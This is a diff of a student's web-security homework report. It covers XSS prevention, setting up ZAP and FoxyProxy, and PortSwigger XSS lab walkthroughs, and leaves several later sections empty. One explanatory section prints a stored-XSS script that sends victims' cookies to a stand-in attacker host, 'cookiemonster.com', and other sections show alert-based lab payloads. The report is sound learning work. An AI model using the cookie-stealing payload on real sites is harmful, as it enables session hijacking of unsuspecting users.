@@ -39,12 +39,19 @@
 5. DOM-based XSS
    - The vulnerability exists in client-side code, rather than server-side
 
+How to prevent
+- Filter user input as strictly as possible
+- Encode user-controllable data in HTTP responses
+- Use appropriate response headers suchs as `Content-Type` and `X-Content-Type-Options` to ensure browsers interpret responses as intended
+- Content Security Policy (CSP) to reduce severity of any XSS vulnerability that still occur
+
 
 
 
 
 
 ------
+
 
 
 
@@ -71,9 +78,12 @@ Install and start it on Kali:
 $ sudo apt install zaproxy
 $ zaproxy
 ```
-From this point on, there's two ways we can go about this. The first option i'm going to show now, and it's perferct if we just quickly want to test a website. 
+From this point on there's two ways we can go about this. Because ZAP [generates](<https://www.zaproxy.org/docs/desktop/addons/network/options/servercertificates/#generate>) a Root CA certificate for us, we can either:
+1. Use the cert automatically
+or
+2. Import the cert to our browser
 
-ZAP actually [generates](<https://www.zaproxy.org/docs/desktop/addons/network/options/servercertificates/#generate>) a Root CA certificate for us. We automatically use it by launching the browser through ZAP like so:
+The first option is perfect for quickly testing a website or for one-offs. We do this by launching the browser through ZAP like so:
 
 <img width="1635" height="1086" alt="2026-04-16-23:30:43" src="https://github.com/user-attachments/assets/13f686e1-11c5-4191-9d6d-67da36ef3af8" />
 
@@ -104,29 +114,32 @@ The second method you're going to see next!
 - Add ZAP as a proxy to it
 
 ## Setting up
-Open up extension/add-ons manager, search for "foxyproxy standard" and lastly `Add to Firefox`.
+Open up the extensions-manager, search for "foxyproxy standard" and lastly --> `Add to Firefox`.
 
 What is FoxyProxy?
-- From my understanding it's a proxy manager, especially useful when you have multiple proxies
+- A proxy manager, especially useful when you have multiple proxies
 
 
 Because we want foxyproxy to manage the connection, we're going to do the second version of setting up ZAP. 
 
-We add the CA certificate to our browser like so:
-- In ZAP: `Ctrl+Alt+O` --> `Network` --> `Server Certificates` --> then click save and specify where to save it
-- In Firefox: Open settings --> `Privacy & Security` --> `View Certificates` --> `Authorities` --> `Import` --> "Trust this CA to identify websites"
+First we add the CA certificate to our browser like so:
+
+In ZAP:
+ - `Ctrl+Alt+O` --> `Network` --> `Server Certificates` --> then click `save` and specify where to save it
+
+In Firefox:
+ - Open settings --> `Privacy & Security` --> `View Certificates` --> `Authorities` --> `Import` --> "Trust this CA to identify websites"
   - <img width="1213" height="702" alt="2026-04-17-18:42:11" src="https://github.com/user-attachments/assets/bc1a2e20-f990-40c7-b6f5-6875738f3b2e" />
 
 
-Once we have that sorted, we'll add the ZAP config to foxyproxy
+Once we have that sorted we'll add the ZAP config to foxyproxy
 <img width="1753" height="612" alt="2026-04-17-18:47:46" src="https://github.com/user-attachments/assets/c806a8ba-fa2a-463b-adad-30644d276991" />
 
 
-
-
-Now we can pin the extension to our tab bar and change settings on the go
+We then pin the extension to our tab bar so that we can change settings on the go
 
 <img width="481" height="592" alt="2026-04-17-19:09:33" src="https://github.com/user-attachments/assets/6b420978-3820-4800-b6c7-3d30acbd0af3" />
+
 - If we enable ZAP, everything flows through it
 - If we user "Proxy by Patterns", only portswigger goes through for now
 
@@ -140,15 +153,17 @@ I browsed to `terokarvinen.com` and `archive.org` and we can see it in the outpu
 
 
 ### Exhibit B - Proxy by pattern is on
-First we browse to a random site and then the target that matches the pattern
-Let the timestamps server as adequate proof that it works!
-
+**1. Browse to a random site**
 <img width="591" height="370" alt="2026-04-18-13:48:16" src="https://github.com/user-attachments/assets/055b1749-741d-44ef-8490-6d0846287481" />
 
+**2. Browse to target**
 <img width="568" height="379" alt="2026-04-18-13:48:37" src="https://github.com/user-attachments/assets/41ae50dc-fc69-4957-8573-772f3cea7b8f" />
 
+**3. Target matches the pattern and flows through to ZAP**
 <img width="799" height="172" alt="2026-04-18-13:49:26" src="https://github.com/user-attachments/assets/5a58f78f-fd84-4f80-99ab-e35873036619" />
 
+
+Let the timestamps serve as adequate proof that it works!
 
 
 
@@ -174,13 +189,11 @@ Let the timestamps server as adequate proof that it works!
 - Perform a cross-site scripting attack that calls the `alert` function
 
 
-This one was pretty simple, we can exploit the vulnerability without even opening the developer tools.
-
-We type into the input field
+This one is pretty simple as it's just demonstrating the basic logic behind the vulnerability. We exploit it by typing the following into the search field:
 ```html
 <script>alert('gotcha')</script>
 ```
-Press enter and we get the alert
+Press enter => script runs and we get the alert
 
 <img width="769" height="279" alt="2026-04-18-14:49:00" src="https://github.com/user-attachments/assets/22695c9f-d16c-402a-9bbf-593b86f191d2" />
 
@@ -199,6 +212,166 @@ Press enter and we get the alert
 
 
 # D) [Stored XSS](<https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded>)
+**Description**
+- Lab contains a stored cross-site scripting vulnerability in the comment functionality
+
+**Objective**
+- Submit a comment that calls out the `alert` function when the blog post is viewed
+
+
+Recall that in `stored XSS` the malicious script comes from the website's database. In this case the provided comment is not validated or encoded properly, so we can type almost anything we'd like and the website will store it as is in the database, everytime someone visits the blog post and the comments are loaded the script will run.
+
+We type in the following:
+```html
+<script>alert('takeover')</script>
+```
+And post the comment.
+
+Now every time that specific blog post is opened:
+
+<img width="841" height="808" alt="2026-04-19-13:01:07" src="https://github.com/user-attachments/assets/627d2b60-0831-4cd7-9974-ab6b078cf24e" />
+
+
+<img width="728" height="358" alt="2026-04-19-13:01:14" src="https://github.com/user-attachments/assets/cf11d6b9-2e32-4122-9a23-1d787d25e91f" />
 
 
 
+
+
+--------
+
+
+
+
+# E) xplain
+**Objective**
+- Explain using an example how an attacker might benefit from XSS
+
+
+Let's build on the previous task and say a website is vulnerable to cross-site scripting, specifically the comment section. An attacker can utilize this by posting the following comment:
+```html
+<script>
+  var img = new Image();
+  img.src = 'http://cookiemonster.com/steal.php?cookie=' + encodeURIComponent(document.cookie);
+</script>
+```
+This is a `Stored XSS attack`, as the malicious script is now stored in the websites database. When users visit the webpage where the **contaminated database record** is loaded, the script is run, effectively stealing their cookie. This is active exfiltration, as the script grabs the cookie and physically sends it to an attackers server.
+
+Depending on the extracted cookie, and attacker might be able to 
+- Hijack the session (import the cookie into their own browser and send requests with it, impersonating the victim user)
+- Access sensitive data
+
+
+Source can be found [here](<https://eitca.org/cybersecurity/eitc-is-wapt-web-applications-penetration-testing/web-attacks-practice/http-attributes-cookie-stealing/examination-review-http-attributes-cookie-stealing/how-can-cross-site-scripting-xss-attacks-be-used-to-steal-cookies/>) (original example modified).
+
+
+
+
+
+--------
+
+
+
+
+
+
+# F) [Simple Path Traversal](<https://portswigger.net/web-security/file-path-traversal/lab-simple>)
+
+
+
+
+
+
+
+
+-----
+
+
+
+
+
+
+
+# G) [Path Traversal 2](<https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass>)
+
+
+
+
+
+
+
+
+------
+
+
+
+
+
+
+
+
+# H) [Non-recursive Path Traversal](<https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively>)
+
+
+
+
+
+
+
+
+------
+
+
+
+
+
+
+# I) [IDOR](<https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references>)
+
+
+
+
+
+
+
+
+
+---------
+
+
+
+
+
+
+
+
+# J) Pencode
+**Objective**
+- Install [pencode](<https://github.com/ffuf/pencode>)
+- Encode a string with it
+
+
+
+
+
+
+
+
+
+
+------
+
+
+
+
+
+
+
+
+
+# K) Mitmproxy
+**Objective**
+- Install Mitmproxy
+- Showcase it in the terminal
+- Enable TLS-decryption
+- Pick a GET-request from the history, modify it, and resend it
